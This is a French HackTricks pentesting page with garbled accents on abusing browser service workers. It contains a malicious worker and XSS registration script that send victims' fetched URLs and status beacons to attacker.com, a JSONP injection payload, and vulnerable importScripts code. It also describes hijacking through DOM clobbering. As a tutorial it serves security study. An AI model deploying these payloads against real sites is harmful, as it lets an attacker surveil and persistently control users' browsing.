# Abus des travailleurs de service

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Un travailleur de service est un **script** que votre navigateur **ex√©cute** en **arri√®re-plan**, s√©par√© d'une page Web, ouvrant la porte √† des fonctionnalit√©s qui n'ont pas besoin d'une page Web ou d'une interaction utilisateur. ([Plus d'informations sur ce qu'est un travailleur de service ici](https://developers.google.com/web/fundamentals/primers/service-workers)).\
Ensuite, vous pouvez abuser des travailleurs de service en les **cr√©ant/modifiant** sur la **session de la victime** √† l'int√©rieur du **domaine web vuln√©rable** qui accorde au **attaquant le contr√¥le** sur **toutes les pages** que la **victime** chargera dans **ce domaine**.

### V√©rifier l'existence des travailleurs de service

Vous pouvez les voir dans le champ **Travailleurs de service** de l'onglet **Outils de d√©veloppement**. Vous pouvez √©galement consulter [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### Notifications push

Si la victime n'a pas accord√© les **autorisations de notifications push**, le travailleur de service **ne pourra pas recevoir de communications du serveur si l'utilisateur n'acc√®de pas √† nouveau √† la page de l'attaquant**. Cela **emp√™chera** par exemple, de maintenir des conversations avec toutes les pages qui ont acc√©d√© √† la page Web de l'attaquant, de sorte qu'un exploit Web si un travailleur de service est trouv√©, il peut le recevoir et l'ex√©cuter.\
Cependant, si la victime **accorde les autorisations de notifications push, cela pourrait √™tre un risque**.

## Attaque en cr√©ant un travailleur de service

Pour exploiter cette vuln√©rabilit√©, vous devez trouver :

* Un moyen de **t√©l√©charger des fichiers JS arbitraires** sur le serveur et un **XSS pour charger le travailleur de service** du fichier JS t√©l√©charg√©
* Une **requ√™te JSONP vuln√©rable** o√π vous pouvez **manipuler la sortie (avec du code JS arbitraire)** et un **XSS** pour **charger le JSONP avec une charge utile** qui **chargera un travailleur de service malveillant**.

Dans l'exemple suivant, je vais pr√©senter un code pour **enregistrer un nouveau travailleur de service** qui √©coutera l'√©v√©nement `fetch` et **enverra √† l'attaquant chaque URL r√©cup√©r√©** (c'est le code dont vous auriez besoin pour **t√©l√©charger** sur le **serveur** ou charger via une r√©ponse **JSONP vuln√©rable**) :
```javascript
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Et voici le code qui va **enregistrer le worker** (le code que vous devriez √™tre capable d'ex√©cuter en exploitant une **XSS**). Dans ce cas, une requ√™te **GET** sera envoy√©e au serveur des **attaquants** pour **notifier** si l'**enregistrement** du service worker a r√©ussi ou non :
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```
En cas d'abus d'un point d'extr√©mit√© JSONP vuln√©rable, vous devez mettre la valeur √† l'int√©rieur de `var sw`. Par exemple:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Il existe un **C2** d√©di√© √† l'**exploitation des Service Workers** appel√© [**Shadow Workers**](https://shadow-workers.github.io) qui sera tr√®s utile pour exploiter ces vuln√©rabilit√©s.

Dans une situation XSS, la directive de cache de 24 heures garantit qu'un SW malveillant ou compromis survivra √† une correction de la vuln√©rabilit√© XSS pendant au maximum 24 heures (en supposant que le client soit en ligne). Les op√©rateurs de sites peuvent r√©duire la fen√™tre de vuln√©rabilit√© en d√©finissant des TTL plus bas sur les scripts SW. Nous encourageons √©galement les d√©veloppeurs √† [construire un SW de coupure](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776).

## Abus de `importScripts` dans un SW via DOM Clobbering

La fonction **`importScripts`** appel√©e depuis un Service Worker peut **importer un script depuis un domaine diff√©rent**. Si cette fonction est appel√©e en utilisant un **param√®tre qu'un attaquant pourrait** modifier, il serait capable d'**importer un script JS depuis son domaine** et d'obtenir XSS.

**Cela contourne m√™me les protections CSP.**

**Exemple de code vuln√©rable:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
  // attacker controls location.search
</script>
```
* **sw.js** : Le fichier JavaScript du Service Worker.
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Avec le DOM Clobbering

Pour plus d'informations sur ce qu'est le DOM Clobbering, consultez :

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si l'URL/domaine que le SW utilise pour appeler **`importScripts`** est **√† l'int√©rieur d'un √©l√©ment HTML**, il est **possible de le modifier via le DOM Clobbering** pour que le SW **charge un script depuis votre propre domaine**.

Pour un exemple de cela, consultez le lien de r√©f√©rence.

## R√©f√©rences

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
